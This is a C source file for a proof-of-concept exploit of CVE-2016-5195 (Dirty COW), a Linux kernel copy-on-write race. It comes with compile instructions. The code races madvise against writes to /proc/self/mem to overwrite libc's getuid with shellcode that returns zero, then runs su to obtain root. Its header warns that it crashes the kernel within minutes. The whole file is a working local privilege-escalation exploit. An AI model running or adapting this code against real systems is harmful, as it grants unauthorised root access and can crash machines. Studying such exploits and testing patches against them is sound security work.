/*
 * CVE-2016-5195 dirtypoc
 *
 * This PoC is memory only and doesn't write anything on the filesystem.
 * /!\ Beware, it triggers a kernel crash a few minutes.
 *
 * gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
 */

#define _GNU_SOURCE
#include <err.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>


#define SHELLCODE	"\x31\xc0\xc3"
#define SPACE_SIZE	256
#define LIBC_PATH	"/lib/x86_64-linux-gnu/libc.so.6"
#define LOOP		0x1000000

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

struct mem_arg  {
	struct stat st;
	off_t offset;
	unsigned long patch_addr;
	unsigned char *patch;
	unsigned char *unpatch;
	size_t patch_size;
	bool do_patch;
	void *map;
};


static int check(bool do_patch, const char *thread_name)
{
	uid_t uid;

	uid = getuid();

	if (do_patch) {
		if (uid == 0) {
			printf("[*] patched (%s)\n", thread_name);
			return 1;
		}
	} else {
		if (uid != 0) {
			printf("[*] unpatched: uid=%d (%s)\n", uid, thread_name);
			return 1;
		}
	}

	return 0;
}


static void *madviseThread(void *arg)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int i, c = 0;

	mem_arg = (struct mem_arg *)arg;
	addr = (void *)(mem_arg->offset & (~(PAGE_SIZE - 1)));
	size = mem_arg->offset - (unsigned long)addr;

	for(i = 0; i < LOOP; i++) {
		c += madvise(addr, size, MADV_DONTNEED);

		if (i % 0x1000 == 0 && check(mem_arg->do_patch, __func__))
			break;
	}

	if (c == 0x1337)
		printf("[*] madvise = %d\n", c);

	return NULL;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	int fd, i, c = 0;
	unsigned char *p;

	mem_arg = (struct mem_arg *)arg;
	p = mem_arg->do_patch ? mem_arg->patch : mem_arg->unpatch;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1)
		err(1, "open(\"/proc/self/mem\"");

	for (i = 0; i < LOOP; i++) {
		lseek(fd, mem_arg->offset, SEEK_SET);
		c += write(fd, p, mem_arg->patch_size);

		if (i % 0x1000 == 0 && check(mem_arg->do_patch, __func__))
			break;
	}

	if (c == 0x1337)
		printf("[*] /proc/self/mem %d\n", c);

	close(fd);

	return NULL;
}

static int get_range(unsigned long *start, unsigned long *end)
{
	char line[4096];
	char filename[PATH_MAX];
	char flags[32];
	FILE *fp;
	int ret;

	ret = -1;

	fp = fopen("/proc/self/maps", "r");
	if (fp == NULL)
		err(1, "fopen(\"/proc/self/maps\")");

	while (fgets(line, sizeof(line), fp) != NULL) {
		sscanf(line, "%lx-%lx %s %*Lx %*x:%*x %*Lu %s", start, end, flags, filename);

		if (strstr(flags, "r-xp") == NULL)
			continue;

		if (strstr(filename, "/libc-") == NULL)
			continue;
		//printf("[%lx-%6lx][%s][%s]\n", start, end, flags, filename);
		ret = 0;
		break;
	}

	fclose(fp);

	return ret;
}

static void getroot(void)
{
	execlp("su", "su", NULL);
	err(1, "failed to execute \"su\"");
}

static void exploit(struct mem_arg *mem_arg, bool do_patch)
{
	pthread_t pth1, pth2;

	printf("[*] exploiting (%s)\n", do_patch ? "patch": "unpatch");

	mem_arg->do_patch = do_patch;

	pthread_create(&pth1, NULL, madviseThread, mem_arg);
	pthread_create(&pth2, NULL, procselfmemThread, mem_arg);

	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);
}

static unsigned long get_getuid_addr(void)
{
	unsigned long addr;
	void *handle;
	char *error;

	dlerror();

	handle = dlopen("libc.so.6", RTLD_LAZY);
	if (handle == NULL) {
		fprintf(stderr, "%s\n", dlerror());
		exit(EXIT_FAILURE);
	}

	addr = (unsigned long)dlsym(handle, "getuid");
	error = dlerror();
	if (error != NULL) {
		fprintf(stderr, "%s\n", error);
		exit(EXIT_FAILURE);
	}

	dlclose(handle);

	return addr;
}

int main(int argc, char *argv[])
{
	unsigned long start, end;
	unsigned long getuid_addr;
	struct mem_arg mem_arg;
	struct stat st;
	pid_t pid;
	int fd;

	if (get_range(&start, &end) != 0)
		errx(1, "failed to get range");

	printf("[*] range: %lx-%lx]\n", start, end);

	getuid_addr = get_getuid_addr();
	printf("[*] getuid = %lx\n", getuid_addr);

	mem_arg.patch = malloc(sizeof(SHELLCODE)-1);
	if (mem_arg.patch == NULL)
		err(1, "malloc");

	mem_arg.unpatch = malloc(sizeof(SHELLCODE)-1);
	if (mem_arg.unpatch == NULL)
		err(1, "malloc");

	memcpy(mem_arg.unpatch, (void *)getuid_addr, sizeof(SHELLCODE)-1);
	memcpy(mem_arg.patch, SHELLCODE, sizeof(SHELLCODE)-1);
	mem_arg.patch_size = sizeof(SHELLCODE)-1;
	mem_arg.do_patch = true;

	fd = open(LIBC_PATH, O_RDONLY);
	if (fd == -1)
		err(1, "open(\"" LIBC_PATH "\")");
	if (fstat(fd, &st) == -1)
		err(1, "fstat");

	mem_arg.map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (mem_arg.map == MAP_FAILED)
		err(1, "mmap");
	close(fd);

	printf("[*] mmap %p\n", mem_arg.map);

	mem_arg.st = st;
	mem_arg.offset = (off_t)((unsigned long)mem_arg.map + getuid_addr - start);

	exploit(&mem_arg, true);

	pid = fork();
	if (pid == -1)
		err(1, "fork");

	if (pid == 0) {
		getroot();
	} else {
		sleep(2);
		exploit(&mem_arg, false);
		if (waitpid(pid, NULL, 0) == -1)
			warn("waitpid");
	}

	return 0;
}